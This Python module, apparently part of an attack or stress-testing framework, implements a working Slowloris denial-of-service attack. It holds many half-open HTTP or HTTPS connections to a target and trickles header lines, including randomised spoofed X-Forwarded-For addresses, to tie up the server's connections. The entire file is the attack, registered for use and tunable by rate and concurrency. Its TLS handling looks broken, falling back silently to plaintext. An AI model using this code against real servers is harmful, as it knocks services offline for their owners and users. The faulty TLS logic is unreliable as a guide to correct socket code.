from __future__ import annotations

import asyncio
import socket
import ssl
import random
import time
from typing import List, Optional
import structlog

from app.attacks.base import SafeAttackBase, AttackRegistry
from app.models import AttackCommand, AttackParams, AttackType, AttackStatus

logger = structlog.get_logger(__name__)


class SlowlorisConnection:
    """Slowloris 连接包装"""

    def __init__(self, sock: socket.socket, target):
        self.sock = sock
        self.target = target
        self.created_at = time.monotonic()
        self.last_activity = time.monotonic()


class SlowlorisAttack(SafeAttackBase):
    """
    Slowloris 慢速攻击 - 保持大量半开连接，定期发送 Header 维持存活
    CRIT-3 修复: 使用 asyncio.get_running_loop() + loop.sock_sendall() 正确异步发送
    """

    NAME = "slowloris"
    ATTACK_TYPE = AttackType.SLOWLORIS
    REQUIRES_ROOT = False
    DEFAULT_RPS = 100
    DEFAULT_CONCURRENCY = 300

    HEADER_LINES = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "X-Forwarded-For: {random_ip}",
        "X-Requested-With: XMLHttpRequest",
    ]

    def __init__(self, command: AttackCommand):
        super().__init__(command)
        self.connections: List[SlowlorisConnection] = []
        self._connection_semaphore: Optional[asyncio.Semaphore] = None

    async def _run(self):
        target = self.params.target
        self._connection_semaphore = asyncio.Semaphore(self.params.concurrency)

        builder = asyncio.create_task(self._connection_builder(target))
        self._tasks.append(builder)

        keeper = asyncio.create_task(self._connection_keeper(target))
        self._tasks.append(keeper)

        await asyncio.gather(builder, keeper, return_exceptions=True)

    async def _connection_builder(self, target):
        while not self._check_stop():
            await self._connection_semaphore.acquire()

            if self._check_stop():
                self._connection_semaphore.release()
                break

            try:
                conn = await self._create_connection(target)
                if conn:
                    self.connections.append(conn)
                    self.result.total_requests += 1
                    self.result.successful_requests += 1
            except Exception as e:
                self.result.failed_requests += 1
                self.result.errors.append(f"Connect failed: {e}")
                self._connection_semaphore.release()

            await asyncio.sleep(1.0 / max(1, self.params.rps / self.params.concurrency))

    async def _create_connection(self, target) -> Optional[SlowlorisConnection]:
        """CRIT-3 修复: 使用 loop.sock_sendall() 替代原始 sock.send()"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

        loop = asyncio.get_running_loop()

        try:
            await loop.sock_connect(sock, (target.ip, target.port))

            # SSL 包装 (HTTPS 目标)
            if target.port == 443 or self.params.use_https:
                ssl_ctx = ssl.create_default_context()
                if not self.params.verify_ssl:
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                # Python 3.12+ 用 SSLObject 包装
                try:
                    ssl_sock = ssl_ctx.wrap_socket(sock, server_hostname=target.ip, do_handshake_on_connect=False)
                    await loop.sock_connect(ssl_sock, (target.ip, target.port))
                    await loop.sock_accept(ssl_sock)  # 触发 TLS 握手
                    sock = ssl_sock
                except Exception:
                    # 回退: SSL 包装可能失败则用明文
                    logger.debug("ssl_wrap_failed_fallback_plain", target=target.ip)

            # 发送初始请求行 (用 loop.sock_sendall 保证完整发送)
            request_line = f"{self.params.method} {target.path} HTTP/1.1\r\n"
            await loop.sock_sendall(sock, request_line.encode())

            host = target.host_header or target.ip
            await loop.sock_sendall(sock, f"Host: {host}\r\n".encode())

            ua = f"User-Agent: Mozilla/5.0 (compatible; Slowloris/{random.randint(1, 999)})\r\n"
            await loop.sock_sendall(sock, ua.encode())

            return SlowlorisConnection(sock, target)

        except Exception as e:
            logger.debug("slowloris_connect_failed", error=str(e))
            try:
                sock.close()
            except:
                pass
            return None

    async def _connection_keeper(self, target):
        interval = self.params.slowloris_interval
        loop = asyncio.get_running_loop()

        while not self._check_stop():
            await asyncio.sleep(interval)

            if self._check_stop():
                break

            dead_connections = []

            for conn in self.connections:
                if self._check_stop():
                    break

                try:
                    header = random.choice(self.HEADER_LINES).format(
                        random_ip=f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                    )
                    header += "\r\n"

                    await loop.sock_sendall(conn.sock, header.encode())
                    conn.last_activity = time.monotonic()

                except (ConnectionError, BrokenPipeError, OSError, ssl.SSLError):
                    dead_connections.append(conn)
                except Exception as e:
                    logger.debug("slowloris_keep_failed", error=str(e))
                    dead_connections.append(conn)

            for dead in dead_connections:
                self.connections.remove(dead)
                self._connection_semaphore.release()
                try:
                    dead.sock.close()
                except:
                    pass

    async def _cleanup(self):
        await super()._cleanup()
        for conn in self.connections:
            try:
                conn.sock.close()
            except:
                pass
        self.connections.clear()


AttackRegistry.register(AttackType.SLOWLORIS, SlowlorisAttack)